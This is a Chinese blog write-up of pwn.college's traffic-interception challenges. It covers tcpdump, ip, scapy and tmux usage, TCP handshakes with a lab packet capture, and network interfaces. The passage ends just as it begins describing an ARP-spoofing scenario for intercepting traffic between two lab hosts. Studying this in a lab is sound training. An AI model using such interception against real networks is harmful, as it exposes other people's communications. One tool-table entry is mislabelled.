<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="keywords" content="PWN-College-Web-4-Writeup, 老叭美食家">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>PWN-College-Web-4-Writeup | 老叭美食家</title>
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//favicon.png">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//css/my.css">

    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="老叭美食家" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/static/image/header/home.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">老叭美食家</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>主页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>联系</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">老叭美食家</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			主页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			联系
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">PWN-College-Web-4-Writeup</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tag/Web/">
                                <span class="chip bg-color">Web</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/category/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-09-07
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-04-30
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    5.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    24 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a target="_blank" rel="noopener" href="https://pwn.college/intro-to-cybersecurity/intercepting-communication/">https://pwn.college/intro-to-cybersecurity/intercepting-communication/</a></p>
<h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-工具使用"><a href="#1-工具使用" class="headerlink" title="1. 工具使用"></a>1. 工具使用</h3><p><code>tcpdump</code>工具</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>port</td>
<td>指定端口</td>
</tr>
<tr>
<td>-nn</td>
<td>不解析主机名和服务名，直接显示ip和端口号</td>
</tr>
<tr>
<td>-tttt</td>
<td>显示详细的时间戳</td>
</tr>
<tr>
<td>-x</td>
<td>以十六进制和ascii格式显示数据包的内容</td>
</tr>
<tr>
<td>-w</td>
<td>保存数据包</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>ip</code>工具</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>addr add <code>&lt;ip&gt;</code> dev <code>&lt;devname&gt;</code></td>
<td>为网卡添加多个ip地址</td>
</tr>
<tr>
<td>addr show</td>
<td>不解析主机名和服务名，直接显示ip和端口号</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>route</code>工具</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>-n</td>
<td>列举本机的系统路由表</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>tmux</code>工具</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>new -s name</td>
<td>添加名为name的窗口</td>
</tr>
<tr>
<td>attach -t name</td>
<td>链接名为name的窗口</td>
</tr>
<tr>
<td>kill-session -t name</td>
<td>删除为名name的窗口</td>
</tr>
<tr>
<td>switch -t name</td>
<td>切换会话</td>
</tr>
<tr>
<td><code>CTRL + B </code> 和 <code>D</code></td>
<td>detach这个会话的快捷键，因为有的时候这个会话窗口正在执行命令，没办法通过命令执行的方式退出。</td>
</tr>
<tr>
<td>ls</td>
<td>显示所有会话</td>
</tr>
<tr>
<td>attach -t name</td>
<td>链接名为name的会话</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>scapy</code></p>
<table>
<thead>
<tr>
<th>序号</th>
<th>层名</th>
</tr>
</thead>
<tbody><tr>
<td>4</td>
<td>传输层</td>
</tr>
<tr>
<td>3</td>
<td>网络层</td>
</tr>
<tr>
<td>2</td>
<td>数据链路层</td>
</tr>
<tr>
<td>1</td>
<td>物理层</td>
</tr>
</tbody></table>
<ul>
<li><p>**<code>sr()</code>**（Send and Receive）：</p>
<ul>
<li>发送三层数据包（如 IP、TCP、UDP 等），并等待一个或多个响应。通常用于需要查看发送数据包后的回应情况（如 ICMP 回应）。</li>
<li>使用场景：发送一个或多个数据包，等待多个响应数据包，例如网络探测和扫描。</li>
</ul>
<p>**<code>sr1()</code>**（Send and Receive 1）：</p>
<ul>
<li>发送三层数据包，并只等待接收一个数据包的响应（第一个响应）。这是 <code>sr()</code> 的简化版本，只对第一个响应感兴趣。</li>
<li>使用场景：例如发送 TCP SYN 包并期待收到第一个 SYN-ACK 响应，用于简单的通信。</li>
</ul>
<p>**<code>srp()</code>**（Send and Receive at Layer 2）：</p>
<ul>
<li>发送二层数据包（如以太网帧，ARP 请求等），并等待响应。适合处理链路层数据包（OSI 模型的第二层，如 Ethernet）。</li>
<li>使用场景：例如 ARP 扫描和二层协议相关操作。</li>
</ul>
<p>**<code>send()</code>**：</p>
<ul>
<li>仅发送三层数据包，不等待任何响应。Scapy 会自动处理路由和二层信息（如以太网帧的封装）。</li>
<li>使用场景：不需要关心是否有响应的情况，如只发送 ICMP 请求或构造攻击流量。</li>
</ul>
<p>**<code>sendp()</code>**：</p>
<ul>
<li>发送二层数据包，不等待响应。直接处理链路层（如以太网帧），而不是依赖系统路由。</li>
<li>使用场景：在需要直接控制链路层数据包时，如发送自定义的以太网帧。</li>
</ul>
</li>
</ul>
<h3 id="2-三次握手和四次挥手的数据包"><a href="#2-三次握手和四次挥手的数据包" class="headerlink" title="2. 三次握手和四次挥手的数据包"></a>2. 三次握手和四次挥手的数据包</h3><h4 id="三次握手（建立连接）"><a href="#三次握手（建立连接）" class="headerlink" title="三次握手（建立连接）"></a><strong>三次握手（建立连接）</strong></h4><p>TCP 的三次握手用于确保双方都知道彼此的存在，并且可以正确同步各自的序列号和确认号，从而保证数据的可靠传输。</p>
<ol>
<li><strong>第一次握手（SYN）</strong>：<ul>
<li>客户端发送一个 <code>SYN</code>（同步序列号）请求给服务器，表明客户端希望建立连接，并携带初始序列号（<code>seq</code>）。</li>
</ul>
</li>
<li><strong>第二次握手（SYN-ACK）</strong>：<ul>
<li>服务器收到 <code>SYN</code> 后，回复一个带有 <code>SYN</code> 和 <code>ACK</code>（确认）标志的响应，表示它同意建立连接，并且确认了客户端的初始序列号。服务器还会发送自己的初始序列号。</li>
</ul>
</li>
<li><strong>第三次握手（ACK）</strong>：<ul>
<li>客户端收到 <code>SYN-ACK</code> 后，再回复一个 <code>ACK</code>，表示确认了服务器的初始序列号，并完成连接建立。</li>
</ul>
</li>
</ol>
<p><strong>四次挥手</strong>：关闭 TCP 连接的过程通常称为“四次挥手”：</p>
<ol>
<li><strong>第一步</strong>：主动关闭方发送一个带有 FIN 标志的数据包。</li>
<li><strong>第二步</strong>：被动关闭方接收到这个 FIN 数据包后，发送一个 ACK 确认。</li>
<li><strong>第三步</strong>：被动关闭方发送自己的 FIN 数据包，表示它也完成了数据传输。</li>
<li><strong>第四步</strong>：主动关闭方接收到 FIN 数据包后，发送一个 ACK 确认，连接关闭完成。</li>
</ol>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">
19:37:27.714010 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [S], seq 3927600946, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
	0x0000:  4500 0034 8081 4000 4006 a460 c0a8 ca01  E..4..@.@..`....
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f32 0000 0000  .....~09..o2....
	0x0020:  8002 faf0 f137 0000 0204 05b4 0103 0308  .....7..........
	0x0030:  0101 0402                                ....
19:37:27.714030 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [S.], seq 3152951559, ack 3927600947, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
	0x0000:  4500 0034 0000 4000 4006 24e2 c0a8 ca8f  E..4..@.@.$.....
	0x0010:  c0a8 ca01 3039 e37e bbee 3907 ea1a 6f33  ....09.~..9...o3
	0x0020:  8012 faf0 1609 0000 0204 05b4 0101 0402  ................
	0x0030:  0103 0307                                ....
19:37:27.714280 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [.], ack 1, win 4106, length 0
	0x0000:  4500 0028 8082 4000 4006 a46b c0a8 ca01  E..(..@.@..k....
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f33 bbee 3908  .....~09..o3..9.
	0x0020:  5010 100a 27eb 0000 0000 0000 0000       P...'.........
19:37:27.731273 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [P.], seq 1:86, ack 1, win 4106, length 85
	0x0000:  4500 007d 8083 4000 4006 a415 c0a8 ca01  E..&#125;..@.@.......
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f33 bbee 3908  .....~09..o3..9.
	0x0020:  5018 100a c4a4 0000 4745 5420 2f20 4854  P.......GET./.HT
	0x0030:  5450 2f31 2e31 0d0a 486f 7374 3a20 3139  TP/1.1..Host:.19
	0x0040:  322e 3136 382e 3230 322e 3134 333a 3132  2.168.202.143:12
	0x0050:  3334 350d 0a55 7365 722d 4167 656e 743a  345..User-Agent:
	0x0060:  2063 7572 6c2f 372e 3535 2e31 0d0a 4163  .curl/7.55.1..Ac
	0x0070:  6365 7074 3a20 2a2f 2a0d 0a0d 0a         cept:.*/*....
19:37:27.731291 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [.], ack 86, win 502, length 0
	0x0000:  4500 0028 2d5f 4000 4006 f78e c0a8 ca8f  E..(-_@.@.......
	0x0010:  c0a8 ca01 3039 e37e bbee 3908 ea1a 6f88  ....09.~..9...o.
	0x0020:  5010 01f6 15fd 0000                      P.......
19:37:45.859884 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [F.], seq 1, ack 86, win 502, length 0
	0x0000:  4500 0028 2d60 4000 4006 f78d c0a8 ca8f  E..(-`@.@.......
	0x0010:  c0a8 ca01 3039 e37e bbee 3908 ea1a 6f88  ....09.~..9...o.
	0x0020:  5011 01f6 15fd 0000                      P.......
19:37:45.860242 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [.], ack 2, win 4106, length 0
	0x0000:  4500 0028 8084 4000 4006 a469 c0a8 ca01  E..(..@.@..i....
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f88 bbee 3909  .....~09..o...9.
	0x0020:  5010 100a 2795 0000 0000 0000 0000       P...'.........
19:37:49.128674 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [F.], seq 86, ack 2, win 4106, length 0
	0x0000:  4500 0028 8085 4000 4006 a468 c0a8 ca01  E..(..@.@..h....
	0x0010:  c0a8 ca8f e37e 3039 ea1a 6f88 bbee 3909  .....~09..o...9.
	0x0020:  5011 100a 2794 0000 0000 0000 0000       P...'.........
19:37:49.128690 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [.], ack 87, win 502, length 0
	0x0000:  4500 0028 0000 4000 4006 24ee c0a8 ca8f  E..(..@.@.$.....
	0x0010:  c0a8 ca01 3039 e37e bbee 3909 ea1a 6f89  ....09.~..9...o.
	0x0020:  5010 01f6 35a8 0000                      P...5...
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="3-为什么是三次握手和四次挥手？"><a href="#3-为什么是三次握手和四次挥手？" class="headerlink" title="3. 为什么是三次握手和四次挥手？"></a>3. 为什么是三次握手和四次挥手？</h3><h4 id="为什么是三次握手？"><a href="#为什么是三次握手？" class="headerlink" title="为什么是三次握手？"></a><strong>为什么是三次握手？</strong></h4><ul>
<li><strong>最少次数确保同步</strong>：三次握手足以保证双方知道对方的序列号、确认号，并且确认连接的可靠性。如果只有两次握手，客户端无法确认服务器收到了它的 SYN 并正确理解了它的初始序列号，服务器也无法确认客户端知道它的序列号。</li>
<li><strong>效率最优</strong>：三次握手是实现可靠数据传输的最小次数。如果增加更多握手次数，不会显著提高连接的可靠性，反而会增加不必要的延迟。</li>
</ul>
<h4 id="为什么是四次挥手？"><a href="#为什么是四次挥手？" class="headerlink" title="为什么是四次挥手？"></a>为什么是四次挥手？</h4><ul>
<li><strong>双向关闭</strong>：TCP 连接是双向的，每一方都需要分别关闭各自的发送通道。客户端和服务器需要独立发送和确认 <code>FIN</code>，因此每一方需要两步：发送 <code>FIN</code> 和确认对方的 <code>FIN</code>。</li>
<li><strong>避免数据丢失</strong>：四次挥手保证了双方都有机会在关闭连接前完成数据传输。特别是服务器在收到客户端的 <code>FIN</code> 后，可能还有未发送的数据需要发送出去，这时它可以先回复 <code>ACK</code>，然后继续发送数据，等发送完毕后再发送 <code>FIN</code>。如果服务器在收到客户端的 <code>FIN</code> 数据包后还有未发送的数据，客户端<strong>仍会继续确认服务器发送的数据包</strong>，即使客户端已经发送了 <code>FIN</code> 来关闭自己到服务器的传输通道。</li>
</ul>
<h3 id="4-一个主机可以绑定多个ip地址。"><a href="#4-一个主机可以绑定多个ip地址。" class="headerlink" title="4. 一个主机可以绑定多个ip地址。"></a>4. 一个主机可以绑定多个ip地址。</h3><p><strong>虚拟主机</strong>：在同一物理服务器上运行多个网站，每个网站绑定不同的 IP 地址。</p>
<p><strong>多网络配置</strong>：主机可以同时连接多个网络，并在不同网络间转发流量。</p>
<p><strong>负载均衡</strong>：使用多个 IP 地址以支持负载均衡应用。</p>
<h3 id="5-send-和sendp的区别"><a href="#5-send-和sendp的区别" class="headerlink" title="5. send 和sendp的区别"></a>5. send 和sendp的区别</h3><p><code>Scapy</code> 中的 <code>sendp</code> 和 <code>send</code> 都是用于发送数据包的函数，但它们的作用范围不同，主要区别在于<strong>协议层</strong>的不同：</p>
<h4 id="1-sendp-："><a href="#1-sendp-：" class="headerlink" title="1. **sendp**："></a>1. **<code>sendp</code>**：</h4><ul>
<li><strong>用于发送链路层（数据链路层）报文</strong>，包括以太网帧。</li>
<li>需要<strong>指定网络接口</strong>（如 <code>eth0</code>），因为在链路层发送报文时，需要明确指定从哪个物理接口发送。</li>
<li>适用于发送包含 <code>Ether</code> 头部的原始帧，或进行更低级别的网络通信，如自定义的以太网帧</li>
</ul>
<h4 id="2-send-："><a href="#2-send-：" class="headerlink" title="2. **send**："></a>2. **<code>send</code>**：</h4><ul>
<li><strong>用于发送网络层（IP层）报文</strong>，如 ICMP、TCP、UDP 数据包。</li>
<li>不需要指定网络接口，Scapy 会自动选择合适的接口（通常是根据路由表决定的）。</li>
<li>适用于发送网络层以上的报文，不包括以太网头部。</li>
</ul>
<h3 id="6-lo-Loopback-和eth0接口的区别"><a href="#6-lo-Loopback-和eth0接口的区别" class="headerlink" title="6. lo(Loopback)和eth0接口的区别"></a>6. lo(Loopback)和eth0接口的区别</h3><h5 id="eth0-接口："><a href="#eth0-接口：" class="headerlink" title="eth0 接口："></a><strong><code>eth0</code> 接口：</strong></h5><ul>
<li><strong><code>eth0</code> 是以太网接口</strong>，它负责连接你的主机和外部网络。数据包通过这个接口与外部设备、路由器、交换机等通信。<code>eth0</code> 接口使用你配置的 IPv4 地址 <code>10.0.0.2</code> 来和外部主机（例如 <code>10.0.0.3</code>）进行通信。</li>
<li><strong>使用场景</strong>：用于与其他网络设备通信，例如通过这个接口发送数据包到其他主机或接入外部网络。</li>
</ul>
<h5 id="lo-Loopback-接口："><a href="#lo-Loopback-接口：" class="headerlink" title="lo (Loopback) 接口："></a><strong><code>lo</code> (Loopback) 接口：</strong></h5><ul>
<li><strong><code>lo</code> 接口是本地回环接口</strong>，用于在同一台机器上测试和通信。通过 <code>lo</code> 发送的数据包永远不会离开本机，它只会在本地回环。因此，任何发送到 <code>127.0.0.1</code> 或本地回环的 IP 地址的数据包，都通过 <code>lo</code> 接口处理。</li>
<li><strong>使用场景</strong>：用于自测应用程序、开发和调试。例如，访问本机的服务时使用 <code>127.0.0.1</code>（本地 IP 地址）。</li>
</ul>
<p>如果你使用 <code>Scapy</code> 的 <code>send()</code> 函数发送 IP 层数据包，而没有指定接口，系统会根据路由表自动选择合适的网络接口。这通常是基于目标 IP 地址来决定的。</p>
<h4 id="如何选择接口："><a href="#如何选择接口：" class="headerlink" title="如何选择接口："></a>如何选择接口：</h4><ul>
<li>通过路由表：操作系统会检查路由表，基于目标 IP 地址找到最合适的出接口。例如：<ul>
<li>如果目标 IP 地址是本地回环地址（如 <code>127.0.0.1</code>），则数据包会通过 <code>lo</code>（回环接口）发送。</li>
<li>如果目标 IP 地址是局域网中的其他主机（如 <code>10.0.0.3</code>），则数据包会通过 <code>eth0</code>（以太网接口）发送。</li>
</ul>
</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h2 id="level-13—–写着写着给我绕晕了。。。。"><a href="#level-13—–写着写着给我绕晕了。。。。" class="headerlink" title="level 13—–写着写着给我绕晕了。。。。"></a>level 13—–写着写着给我绕晕了。。。。</h2><p><strong>关于ARP欺骗的，好像我之前上刚子（梁刚老师）的《产品实践课程》的时候，这个问题我就犯过一次</strong></p>
<p><strong>场景</strong>：<code>10.0.0.4</code> 想要跟<code>10.0.0.2 </code>建立通信（4会发起tcp第三次握手给2），<code>10.0.0.3</code>想要获取他们之间的数据流，那么有两种方式，</p>
<ul>
<li><p>一种是<code>10.0.0.3</code>发送arp相应包声称自己的mac地址是.2的mac地址，</p>
</li>
